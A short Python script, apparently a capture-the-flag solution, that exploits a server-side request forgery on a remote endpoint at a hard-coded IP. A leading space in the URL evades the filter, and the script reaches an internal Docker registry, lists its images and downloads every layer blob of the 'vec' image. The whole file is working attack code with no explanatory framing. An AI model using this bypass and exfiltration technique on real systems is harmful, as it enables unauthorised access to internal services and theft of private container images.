import requests

URL  = 'http://34.18.13.217:52593/okay'

# Notice the whitespace at the beginning of the URL
INTERNAL_URL = ' http://registry:5000/v2/'

# Get the name of the image
def get_image_name():
    r = requests.post(URL, data={'url': INTERNAL_URL+'_catalog'})
    print(r.json())


# Get the manifest and get the blobs
def get_blobs():
    r = requests.post(URL, data={'url': INTERNAL_URL+'vec/manifests/latest'})
    # Parse it as json
    parsed = r.json()
    fsLayers = parsed['fsLayers']
    count  = 0
    for i in fsLayers:
        blob_sum  = i['blobSum']
        dowload_path = './blobs/'+str(count)+'.tar.gz'
        r = requests.post(URL, data={'url': INTERNAL_URL+'vec/blobs/'+blob_sum})
        print(r.text)
        if(r.status_code == 200):
            with open(dowload_path,'wb') as file:
                file.write(r.content)
        count += 1 

get_blobs()
